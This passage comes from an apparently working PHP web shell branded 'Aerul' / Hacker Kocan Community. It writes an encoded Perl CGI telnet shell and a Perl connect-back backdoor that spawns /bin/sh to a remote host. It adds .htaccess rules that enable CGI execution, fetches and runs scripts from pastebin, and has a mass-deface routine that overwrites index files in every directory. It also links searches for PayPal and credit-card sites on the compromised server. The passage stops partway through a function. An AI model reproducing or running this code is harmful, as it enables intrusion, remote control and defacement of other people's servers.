cC4kQ21kUHdkOwoJCWNob3AoJEN1cnJlbnREaXIgPSBgJENvbW1hbmRgKTsKCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7CgkJJFByb21wdCA9ICRXaW5OVCA/ICIkT2xkRGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJE9sZERpcl1cJCAiOwoJCXByaW50ICI8Y29kZT4kUHJvbXB0ICRSdW5Db21tYW5kPC9jb2RlPiI7Cgl9CgllbHNlICMgc29tZSBvdGhlciBjb21tYW5kLCBkaXNwbGF5IHRoZSBvdXRwdXQKCXsKCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7CgkJJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7CgkJcHJpbnQgIjxjb2RlPiRQcm9tcHQgJFJ1bkNvbW1hbmQ8L2NvZGU+PHhtcD4iOwoJCSRDb21tYW5kID0gImNkIFwiJEN1cnJlbnREaXJcIiIuJENtZFNlcC4kUnVuQ29tbWFuZC4kUmVkaXJlY3RvcjsKCQlpZighJFdpbk5UKQoJCXsKCQkJJFNJR3snQUxSTSd9ID0gXCZDb21tYW5kVGltZW91dDsKCQkJYWxhcm0oJENvbW1hbmRUaW1lb3V0RHVyYXRpb24pOwoJCX0KCQlpZigkU2hvd0R5bmFtaWNPdXRwdXQpICMgc2hvdyBvdXRwdXQgYXMgaXQgaXMgZ2VuZXJhdGVkCgkJewoJCQkkfD0xOwoJCQkkQ29tbWFuZCAuPSAiIHwiOwoJCQlvcGVuKENvbW1hbmRPdXRwdXQsICRDb21tYW5kKTsKCQkJd2hpbGUoPENvbW1hbmRPdXRwdXQ+KQoJCQl7CgkJCQkkXyA9fiBzLyhcbnxcclxuKSQvLzsKCQkJCXByaW50ICIkX1xuIjsKCQkJfQoJCQkkfD0wOwoJCX0KCQllbHNlICMgc2hvdyBvdXRwdXQgYWZ0ZXIgY29tbWFuZCBjb21wbGV0ZXMKCQl7CgkJCXByaW50IGAkQ29tbWFuZGA7CgkJfQoJCWlmKCEkV2luTlQpCgkJewoJCQlhbGFybSgwKTsKCQl9CgkJcHJpbnQgIjwveG1wPiI7Cgl9CgkmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsKCSZQcmludFBhZ2VGb290ZXI7Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUaGlzIGZ1bmN0aW9uIGRpc3BsYXlzIHRoZSBwYWdlIHRoYXQgY29udGFpbnMgYSBsaW5rIHdoaWNoIGFsbG93cyB0aGUgdXNlcgojIHRvIGRvd25sb2FkIHRoZSBzcGVjaWZpZWQgZmlsZS4gVGhlIHBhZ2UgYWxzbyBjb250YWlucyBhIGF1dG8tcmVmcmVzaAojIGZlYXR1cmUgdGhhdCBzdGFydHMgdGhlIGRvd25sb2FkIGF1dG9tYXRpY2FsbHkuCiMgQXJndW1lbnQgMTogRnVsbHkgcXVhbGlmaWVkIGZpbGVuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIGRvd25sb2FkZWQKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUHJpbnREb3dubG9hZExpbmtQYWdlCnsKCWxvY2FsKCRGaWxlVXJsKSA9IEBfOwoJaWYoLWUgJEZpbGVVcmwpICMgaWYgdGhlIGZpbGUgZXhpc3RzCgl7CgkJIyBlbmNvZGUgdGhlIGZpbGUgbGluayBzbyB3ZSBjYW4gc2VuZCBpdCB0byB0aGUgYnJvd3NlcgoJCSRGaWxlVXJsID1+IHMvKFteYS16QS1aMC05XSkvJyUnLnVucGFjaygiSCoiLCQxKS9lZzsKCQkkRG93bmxvYWRMaW5rID0gIiRTY3JpcHRMb2NhdGlvbj9hPWRvd25sb2FkJmY9JEZpbGVVcmwmbz1nbyI7CgkJJEh0bWxNZXRhSGVhZGVyID0gIjxtZXRhIEhUVFAtRVFVSVY9XCJSZWZyZXNoXCIgQ09OVEVOVD1cIjE7IFVSTD0kRG93bmxvYWRMaW5rXCI+IjsKCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7CgkJcHJpbnQgPDxFTkQ7Cjxjb2RlPgpTZW5kaW5nIEZpbGUgJFRyYW5zZmVyRmlsZS4uLjxicj4KSWYgdGhlIGRvd25sb2FkIGRvZXMgbm90IHN0YXJ0IGF1dG9tYXRpY2FsbHksCjxhIGhyZWY9IiREb3dubG9hZExpbmsiPkNsaWNrIEhlcmU8L2E+Lgo8L2NvZGU+CkVORAoJCSZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOwoJCSZQcmludFBhZ2VGb290ZXI7Cgl9CgllbHNlICMgZmlsZSBkb2Vzbid0IGV4aXN0Cgl7CgkJJlByaW50UGFnZUhlYWRlcigiZiIpOwoJCXByaW50ICI8Y29kZT5GYWlsZWQgdG8gZG93bmxvYWQgJEZpbGVVcmw6ICQhPC9jb2RlPiI7CgkJJlByaW50RmlsZURvd25sb2FkRm9ybTsKCQkmUHJpbnRQYWdlRm9vdGVyOwoJfQp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiByZWFkcyB0aGUgc3BlY2lmaWVkIGZpbGUgZnJvbSB0aGUgZGlzayBhbmQgc2VuZHMgaXQgdG8gdGhlCiMgYnJvd3Nlciwgc28gdGhhdCBpdCBjYW4gYmUgZG93bmxvYWRlZCBieSB0aGUgdXNlci4KIyBBcmd1bWVudCAxOiBGdWxseSBxdWFsaWZpZWQgcGF0aG5hbWUgb2YgdGhlIGZpbGUgdG8gYmUgc2VudC4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgU2VuZEZpbGVUb0Jyb3dzZXIKewoJbG9jYWwoJFNlbmRGaWxlKSA9IEBfOwoJaWYob3BlbihTRU5ERklMRSwgJFNlbmRGaWxlKSkgIyBmaWxlIG9wZW5lZCBmb3IgcmVhZGluZwoJewoJCWlmKCRXaW5OVCkKCQl7CgkJCWJpbm1vZGUoU0VOREZJTEUpOwoJCQliaW5tb2RlKFNURE9VVCk7CgkJfQoJCSRGaWxlU2l6ZSA9IChzdGF0KCRTZW5kRmlsZSkpWzddOwoJCSgkRmlsZW5hbWUgPSAkU2VuZEZpbGUpID1+ICBtIShbXi9eXFxdKikkITsKCQlwcmludCAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXVua25vd25cbiI7CgkJcHJpbnQgIkNvbnRlbnQtTGVuZ3RoOiAkRmlsZVNpemVcbiI7CgkJcHJpbnQgIkNvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPSQxXG5cbiI7CgkJcHJpbnQgd2hpbGUoPFNFTkRGSUxFPik7CgkJY2xvc2UoU0VOREZJTEUpOwoJfQoJZWxzZSAjIGZhaWxlZCB0byBvcGVuIGZpbGUKCXsKCQkmUHJpbnRQYWdlSGVhZGVyKCJmIik7CgkJcHJpbnQgIjxjb2RlPkZhaWxlZCB0byBkb3dubG9hZCAkU2VuZEZpbGU6ICQhPC9jb2RlPiI7CgkJJlByaW50RmlsZURvd25sb2FkRm9ybTsKCQkmUHJpbnRQYWdlRm9vdGVyOwoJfQp9CgoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHVzZXIgZG93bmxvYWRzIGEgZmlsZS4gSXQgZGlzcGxheXMgYSBtZXNzYWdlCiMgdG8gdGhlIHVzZXIgYW5kIHByb3ZpZGVzIGEgbGluayB0aHJvdWdoIHdoaWNoIHRoZSBmaWxlIGNhbiBiZSBkb3dubG9hZGVkLgojIFRoaXMgZnVuY3Rpb24gaXMgYWxzbyBjYWxsZWQgd2hlbiB0aGUgdXNlciBjbGlja3Mgb24gdGhhdCBsaW5rLiBJbiB0aGlzIGNhc2UsCiMgdGhlIGZpbGUgaXMgcmVhZCBhbmQgc2VudCB0byB0aGUgYnJvd3Nlci4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgQmVnaW5Eb3dubG9hZAp7CgkjIGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkCglpZigoJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXFx8Xi46LykpIHwKCQkoISRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlwvLykpKSAjIHBhdGggaXMgYWJzb2x1dGUKCXsKCQkkVGFyZ2V0RmlsZSA9ICRUcmFuc2ZlckZpbGU7Cgl9CgllbHNlICMgcGF0aCBpcyByZWxhdGl2ZQoJewoJCWNob3AoJFRhcmdldEZpbGUpIGlmKCRUYXJnZXRGaWxlID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87CgkJJFRhcmdldEZpbGUgLj0gJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsKCX0KCglpZigkT3B0aW9ucyBlcSAiZ28iKSAjIHdlIGhhdmUgdG8gc2VuZCB0aGUgZmlsZQoJewoJCSZTZW5kRmlsZVRvQnJvd3NlcigkVGFyZ2V0RmlsZSk7Cgl9CgllbHNlICMgd2UgaGF2ZSB0byBzZW5kIG9ubHkgdGhlIGxpbmsgcGFnZQoJewoJCSZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOwoJfQp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciB3YW50cyB0byB1cGxvYWQgYSBmaWxlLiBJZiB0aGUKIyBmaWxlIGlzIG5vdCBzcGVjaWZpZWQsIGl0IGRpc3BsYXlzIGEgZm9ybSBhbGxvd2luZyB0aGUgdXNlciB0byBzcGVjaWZ5IGEKIyBmaWxlLCBvdGhlcndpc2UgaXQgc3RhcnRzIHRoZSB1cGxvYWQgcHJvY2Vzcy4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgVXBsb2FkRmlsZQp7CgkjIGlmIG5vIGZpbGUgaXMgc3BlY2lmaWVkLCBwcmludCB0aGUgdXBsb2FkIGZvcm0gYWdhaW4KCWlmKCRUcmFuc2ZlckZpbGUgZXEgIiIpCgl7CgkJJlByaW50UGFnZUhlYWRlcigiZiIpOwoJCSZQcmludEZpbGVVcGxvYWRGb3JtOwoJCSZQcmludFBhZ2VGb290ZXI7CgkJcmV0dXJuOwoJfQoJJlByaW50UGFnZUhlYWRlcigiYyIpOwoKCSMgc3RhcnQgdGhlIHVwbG9hZGluZyBwcm9jZXNzCglwcmludCAiPGNvZGU+VXBsb2FkaW5nICRUcmFuc2ZlckZpbGUgdG8gJEN1cnJlbnREaXIuLi48YnI+IjsKCgkjIGdldCB0aGUgZnVsbGx5IHF1YWxpZmllZCBwYXRobmFtZSBvZiB0aGUgZmlsZSB0byBiZSBjcmVhdGVkCgljaG9wKCRUYXJnZXROYW1lKSBpZiAoJFRhcmdldE5hbWUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsKCSRUcmFuc2ZlckZpbGUgPX4gbSEoW14vXlxcXSopJCE7CgkkVGFyZ2V0TmFtZSAuPSAkUGF0aFNlcC4kMTsKCgkkVGFyZ2V0RmlsZVNpemUgPSBsZW5ndGgoJGlueydmaWxlZGF0YSd9KTsKCSMgaWYgdGhlIGZpbGUgZXhpc3RzIGFuZCB3ZSBhcmUgbm90IHN1cHBvc2VkIHRvIG92ZXJ3cml0ZSBpdAoJaWYoLWUgJFRhcmdldE5hbWUgJiYgJE9wdGlvbnMgbmUgIm92ZXJ3cml0ZSIpCgl7CgkJcHJpbnQgIkZhaWxlZDogRGVzdGluYXRpb24gZmlsZSBhbHJlYWR5IGV4aXN0cy48YnI+IjsKCX0KCWVsc2UgIyBmaWxlIGlzIG5vdCBwcmVzZW50Cgl7CgkJaWYob3BlbihVUExPQURGSUxFLCAiPiRUYXJnZXROYW1lIikpCgkJewoJCQliaW5tb2RlKFVQTE9BREZJTEUpIGlmICRXaW5OVDsKCQkJcHJpbnQgVVBMT0FERklMRSAkaW57J2ZpbGVkYXRhJ307CgkJCWNsb3NlKFVQTE9BREZJTEUpOwoJCQlwcmludCAiVHJhbnNmZXJlZCAkVGFyZ2V0RmlsZVNpemUgQnl0ZXMuPGJyPiI7CgkJCXByaW50ICJGaWxlIFBhdGg6ICRUYXJnZXROYW1lPGJyPiI7CgkJfQoJCWVsc2UKCQl7CgkJCXByaW50ICJGYWlsZWQ6ICQhPGJyPiI7CgkJfQoJfQoJcHJpbnQgIjwvY29kZT4iOwoJJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07CgkmUHJpbnRQYWdlRm9vdGVyOwp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciB3YW50cyB0byBkb3dubG9hZCBhIGZpbGUuIElmIHRoZQojIGZpbGVuYW1lIGlzIG5vdCBzcGVjaWZpZWQsIGl0IGRpc3BsYXlzIGEgZm9ybSBhbGxvd2luZyB0aGUgdXNlciB0byBzcGVjaWZ5IGEKIyBmaWxlLCBvdGhlcndpc2UgaXQgZGlzcGxheXMgYSBtZXNzYWdlIHRvIHRoZSB1c2VyIGFuZCBwcm92aWRlcyBhIGxpbmsKIyB0aHJvdWdoICB3aGljaCB0aGUgZmlsZSBjYW4gYmUgZG93bmxvYWRlZC4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgRG93bmxvYWRGaWxlCnsKCSMgaWYgbm8gZmlsZSBpcyBzcGVjaWZpZWQsIHByaW50IHRoZSBkb3dubG9hZCBmb3JtIGFnYWluCglpZigkVHJhbnNmZXJGaWxlIGVxICIiKQoJewoJCSZQcmludFBhZ2VIZWFkZXIoImYiKTsKCQkmUHJpbnRGaWxlRG93bmxvYWRGb3JtOwoJCSZQcmludFBhZ2VGb290ZXI7CgkJcmV0dXJuOwoJfQoJCgkjIGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkCglpZigoJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXFx8Xi46LykpIHwKCQkoISRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlwvLykpKSAjIHBhdGggaXMgYWJzb2x1dGUKCXsKCQkkVGFyZ2V0RmlsZSA9ICRUcmFuc2ZlckZpbGU7Cgl9CgllbHNlICMgcGF0aCBpcyByZWxhdGl2ZQoJewoJCWNob3AoJFRhcmdldEZpbGUpIGlmKCRUYXJnZXRGaWxlID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87CgkJJFRhcmdldEZpbGUgLj0gJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsKCX0KCglpZigkT3B0aW9ucyBlcSAiZ28iKSAjIHdlIGhhdmUgdG8gc2VuZCB0aGUgZmlsZQoJewoJCSZTZW5kRmlsZVRvQnJvd3NlcigkVGFyZ2V0RmlsZSk7Cgl9CgllbHNlICMgd2UgaGF2ZSB0byBzZW5kIG9ubHkgdGhlIGxpbmsgcGFnZQoJewoJCSZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOwoJfQp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgTWFpbiBQcm9ncmFtIC0gRXhlY3V0aW9uIFN0YXJ0cyBIZXJlCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KJlJlYWRQYXJzZTsKJkdldENvb2tpZXM7CgokU2NyaXB0TG9jYXRpb24gPSAkRU5WeydTQ1JJUFRfTkFNRSd9OwokU2VydmVyTmFtZSA9ICRFTlZ7J1NFUlZFUl9OQU1FJ307CiRMb2dpblBhc3N3b3JkID0gJGlueydwJ307CiRSdW5Db21tYW5kID0gJGlueydjJ307CiRUcmFuc2ZlckZpbGUgPSAkaW57J2YnfTsKJE9wdGlvbnMgPSAkaW57J28nfTsKCiRBY3Rpb24gPSAkaW57J2EnfTsKJEFjdGlvbiA9ICJsb2dpbiIgaWYoJEFjdGlvbiBlcSAiIik7ICMgbm8gYWN0aW9uIHNwZWNpZmllZCwgdXNlIGRlZmF1bHQKCiMgZ2V0IHRoZSBkaXJlY3RvcnkgaW4gd2hpY2ggdGhlIGNvbW1hbmRzIHdpbGwgYmUgZXhlY3V0ZWQKJEN1cnJlbnREaXIgPSAkaW57J2QnfTsKY2hvcCgkQ3VycmVudERpciA9IGAkQ21kUHdkYCkgaWYoJEN1cnJlbnREaXIgZXEgIiIpOwoKJExvZ2dlZEluID0gJENvb2tpZXN7J1NBVkVEUFdEJ30gZXEgJFBhc3N3b3JkOwoKaWYoJEFjdGlvbiBlcSAibG9naW4iIHx8ICEkTG9nZ2VkSW4pICMgdXNlciBuZWVkcy9oYXMgdG8gbG9naW4KewoJJlBlcmZvcm1Mb2dpbjsKfQplbHNpZigkQWN0aW9uIGVxICJjb21tYW5kIikgIyB1c2VyIHdhbnRzIHRvIHJ1biBhIGNvbW1hbmQKewoJJkV4ZWN1dGVDb21tYW5kOwp9CmVsc2lmKCRBY3Rpb24gZXEgInVwbG9hZCIpICMgdXNlciB3YW50cyB0byB1cGxvYWQgYSBmaWxlCnsKCSZVcGxvYWRGaWxlOwp9CmVsc2lmKCRBY3Rpb24gZXEgImRvd25sb2FkIikgIyB1c2VyIHdhbnRzIHRvIGRvd25sb2FkIGEgZmlsZQp7CgkmRG93bmxvYWRGaWxlOwp9CmVsc2lmKCRBY3Rpb24gZXEgImxvZ291dCIpICMgdXNlciB3YW50cyB0byBsb2dvdXQKewoJJlBlcmZvcm1Mb2dvdXQ7Cn0K';
$file = fopen("izo.cin" ,"w+");
$write = fwrite ($file ,base64_decode($cgishellizocin));
fclose($file);
chmod("izo.cin",0755);
$netcatshell = 'IyEvdXNyL2Jpbi9wZXJsDQogICAgICB1c2UgU29ja2V0Ow0KICAgICAgcHJpbnQgIkRhdGEgQ2hh
MHMgQ29ubmVjdCBCYWNrIEJhY2tkb29yXG5cbiI7DQogICAgICBpZiAoISRBUkdWWzBdKSB7DQog
ICAgICAgIHByaW50ZiAiVXNhZ2U6ICQwIFtIb3N0XSA8UG9ydD5cbiI7DQogICAgICAgIGV4aXQo
MSk7DQogICAgICB9DQogICAgICBwcmludCAiWypdIER1bXBpbmcgQXJndW1lbnRzXG4iOw0KICAg
ICAgJGhvc3QgPSAkQVJHVlswXTsNCiAgICAgICRwb3J0ID0gODA7DQogICAgICBpZiAoJEFSR1Zb
MV0pIHsNCiAgICAgICAgJHBvcnQgPSAkQVJHVlsxXTsNCiAgICAgIH0NCiAgICAgIHByaW50ICJb
Kl0gQ29ubmVjdGluZy4uLlxuIjsNCiAgICAgICRwcm90byA9IGdldHByb3RvYnluYW1lKCd0Y3An
KSB8fCBkaWUoIlVua25vd24gUHJvdG9jb2xcbiIpOw0KICAgICAgc29ja2V0KFNFUlZFUiwgUEZf
SU5FVCwgU09DS19TVFJFQU0sICRwcm90bykgfHwgZGllICgiU29ja2V0IEVycm9yXG4iKTsNCiAg
ICAgIG15ICR0YXJnZXQgPSBpbmV0X2F0b24oJGhvc3QpOw0KICAgICAgaWYgKCFjb25uZWN0KFNF
UlZFUiwgcGFjayAiU25BNHg4IiwgMiwgJHBvcnQsICR0YXJnZXQpKSB7DQogICAgICAgIGRpZSgi
VW5hYmxlIHRvIENvbm5lY3RcbiIpOw0KICAgICAgfQ0KICAgICAgcHJpbnQgIlsqXSBTcGF3bmlu
ZyBTaGVsbFxuIjsNCiAgICAgIGlmICghZm9yayggKSkgew0KICAgICAgICBvcGVuKFNURElOLCI+
JlNFUlZFUiIpOw0KICAgICAgICBvcGVuKFNURE9VVCwiPiZTRVJWRVIiKTsNCiAgICAgICAgb3Bl
bihTVERFUlIsIj4mU0VSVkVSIik7DQogICAgICAgIGV4ZWMgeycvYmluL3NoJ30gJy1iYXNoJyAu
ICJcMCIgeCA0Ow0KICAgICAgICBleGl0KDApOw0KICAgICAgfQ0KICAgICAgcHJpbnQgIlsqXSBE
YXRhY2hlZFxuXG4iOw==';
$file = fopen("dc.pl" ,"w+");
$write = fwrite ($file ,base64_decode($netcatshell));
fclose($file);
chmod("dc.pl",0755);
echo "<iframe src=cgitelnet1/izo.cin width=96% height=90% frameborder=0></iframe>
</div>";
?>
<?php
}

/////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'configsh3ll'))
{
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=configsh3ll" method="post">
<?php
echo "<center/><br/><b><font color=lime>+--==[ Config Shell Priv8 Aerul ]==--+</font></b><br><br>";
mkdir('terjang', 0755);
chdir('terjang');
$kokdosya = ".htaccess";
$dosya_adi = "$kokdosya";
$dosya = fopen ($dosya_adi , 'w') or die ("Error gan!");
$metin = "Options FollowSymLinks MultiViews Indexes ExecCGI
AddType application/x-httpd-cgi .pl
AddHandler cgi-script .pl
AddHandler cgi-script .pl";
fwrite ( $dosya , $metin ) ;
fclose ($dosya);
$configshell = file_get_contents('http://pastebin.com/raw.php?i=CrhLufY7');
$file = fopen("a.pl" ,"w+");
$write = fwrite ($file ,$configshell);
fclose($file);
chmod("a.pl",0755);
chmod(".htaccess",0755);
echo "<iframe src=terjang/a.pl width=97% height=100% frameborder=0></iframe>
</div>";
?>
<?php
}


//////////////////////////////////////////////////

elseif(isset($_GET['x']) && ($_GET['x'] == 'MD5'))
{
?>
<br>
<iframe
src ="http://www.hashkiller.co.uk/md5-decrypter.aspx"
height="600"
width="100%">
</iframe>
<?php
}
elseif(isset($_GET['x']) && ($_GET['x'] == 'bingreverse'))
{
?>
<br><br><br>
<center><div id="sitelist"><a onClick="window.open('http://www.viewdns.info/reverseip/?host=<?php echo $_SERVER ['SERVER_ADDR']; ?>','POPUP','width=900 0,height=500,scrollbars=10');return false;" href="http://www.viewdns.info/reverseip/?host=<?php echo $_SERVER ['SERVER_ADDR']; ?>">=> DNS Reverse IP <=</a></center>
<br><br><br>
<center><div id="sitelist"><a onClick="window.open('http://www.bing.com/search?q=ip%3A<?php echo $_SERVER ['SERVER_ADDR']; ?>+paypal','POPUP','width=900 0,height=500,scrollbars=10');return false;" href="http://www.bing.com/search?q=ip%3A<?php echo $_SERVER ['SERVER_ADDR']; ?>+paypal">=> Paypal on Server <=</a></center>
<br><br><br>
<center><div id="visa"><a onClick="window.open('http://www.bing.com/search?q=ip%3A<?php echo $_SERVER ['SERVER_ADDR']; ?>+visa+master','POPUP','width=900 0,height=500,scrollbars=10');return false;" href="http://www.bing.com/search?q=ip%3A<?php echo $_SERVER ['SERVER_ADDR']; ?>+visa+master">=> CC on Server <=</a></center>
<?php
}
elseif(isset($_GET['x']) && ($_GET['x'] == 'fans'))
{
?>
<br>
<center><iframe src="//www.facebook.com/plugins/likebox.php?href=http%3A%2F%2Fwww.facebook.com%2Fhackerkocancommunity&amp;width=292&amp;height=590&amp;show_faces=true&amp;colorscheme=dark&amp;stream=true&amp;border_color&amp;header=true&amp;appId=128969567271767" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:292px; height:590px;" allowTransparency="true"></iframe></center>
<?php

}
elseif(isset($_GET['x']) && ($_GET['x'] == 'encrypt'))
{
function base64($text){echo base64_encode($text);}function mdhash($text) {echo md5($text);}function whash($text) {echo crypt($text);}$text = $_POST['code'];?>
<center> <form method="post"><br><br><br><textarea cols=80 rows=5 name="code">aerulcyber</textarea><br><br>
<td>
<form method="post" action="">&nbsp;
		Pilih Jenis Encode=> 
<select class='inputz' size="1" name="ope"><option value="mdhash">md5</option>
<option value="b64">Base64</option>
<option value="whash">wordpress hash</option></select>
<input type='submit' style="color:#00FF1E;background-color:#000000" value='encrypt'></form>
</center><?$op = $_POST["ope"];switch ($op) {case 'b64': $codi=base64($text);break;case 'mdhash' : $codi=mdhash($text);break;case 'whash' : $codi=whash($text);break;default:break;}echo '<div>'.$codi.'</div>';}


////////////////////////////////////////////////

 elseif(isset($_GET['x']) && ($_GET['x'] == 'massdeface'))
{
echo "<center/><br/><b><font color=#00ff00>+--==[ Mass Deface ]==--+</font></b><br>";
error_reporting(0);?>
<form ENCTYPE="multipart/form-data" action="<?php $_SERVER['PHP_SELF']?>" method='post'>
<td><table><table class="tabnet" >
<form method='post'>
<tr>
	<tr>
	<td>&nbsp;&nbsp;Folder</td><td><input class ='inputz' type='text' name='path' size='60' value="<?php echo getcwd();?>"></td>
	</tr><br>
	<tr>
	<td>file name</td><td><input class ='inputz' type='text' name='file' size='60' value="index.php"></td>
	</tr>
</tr>
<th colspan='2'><b>Index code</b></th><br></table>
<textarea style='background:black;outline:none;' name='index' rows='10' cols='67'><title>Hacked by Aerul Da White-Hkc</title>
<link rel="icon" href="https://a2.sndcdn.com/assets/images/sc-icons/favicon-154f6af5.ico">
<head><body oncontextmenu="return false;" onkeydown="return false;" onmousedown="return false;" bgcolor="black">
<div style="onMouseOver=" init(this);rattleimage()" onMouseOut="stoprattle(this);top.focus()" onClick="top.focus()" alt="" border="0">
</style>
</head>
<br><br><br><br><br><br><br><br>
</center>
<center>
<pre><span style="color: #ff0000;">

  ___                  _  ______        _    _ _     _ _              _   _ _        
 / _ \                | | |  _  \      | |  | | |   (_) |            | | | | |       
/ /_\ \ ___ _ __ _   _| | | | | |__ _  | |  | | |__  _| |_ ___ ______| |_| | | _____ 
|  _  |/ _ \ '__| | | | | | | | / _` | | |/\| | '_ \| | __/ _ \______|  _  | |/ / __|</span>
<span style="color: #ffffff;">| | | |  __/ |  | |_| | | | |/ / (_| | \  /\  / | | | | ||  __/      | | | |   < (__ 
\_| |_/\___|_|   \__,_|_| |___/ \__,_|  \/  \/|_| |_|_|\__\___|      \_| |_/_|\_\___|
                                                                                     
                                                                                                                                                                                                                                                                       
</span></pre>
</body>>
<span style="color: #ff0000;"> <center>Hacked by Aerul Da White-Hkc - Hacker Kocan Community <br> contact : http://fb.me/hackerkocancommunity <center>
</html>
</textarea><br>
<center><input class='inputzbut' type='submit' value="&nbsp;&nbsp;Deface&nbsp;&nbsp;"></center></form></table><br></form>

<?php $mainpath=$_POST[path];$file=$_POST[file];$dir=opendir("$mainpath");$code=base64_encode($_POST[index]);$indx=base64_decode($code);while($row=readdir($dir)){$start=@fopen("$row/$file","w+");$finish=@fwrite($start,$indx);if ($finish){echo "$row/$file > Done<br><br>";}}}


///////////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'litespeed'))
    {
    ?>
<form action="?y=<?php echo $pwd; ?>&amp;x=litespeed" method="post">
<br>
<?php
echo "<center/>";
  mkdir('fuck', 0755);
    chdir('fuck');
        $akses = ".htaccess";
        $buka_lah = "$akses";
        $buka = fopen ($buka_lah , 'w') or die ("Error cuyy!");
        $metin = "Options FollowSymLinks MultiViews Indexes ExecCGI
AddType application/x-httpd-cgi .cin
AddHandler cgi-script .cin
AddHandler cgi-script .cin
<Files *.php>
ForceType application/x-httpd-php4
</Files>
";    
        fwrite ( $buka , $metin ) ;
        fclose ($buka);
$fuck = file_get_contents('http://pastebin.com/raw.php?i=iKDBUY8t');
$file = fopen("fuck.cin" ,"w+");
$write = fwrite ($file ,($fuck));
fclose($file);
    chmod("fuck.cin", 0755);
$indexshell = fopen("ini.php" ,"w+");
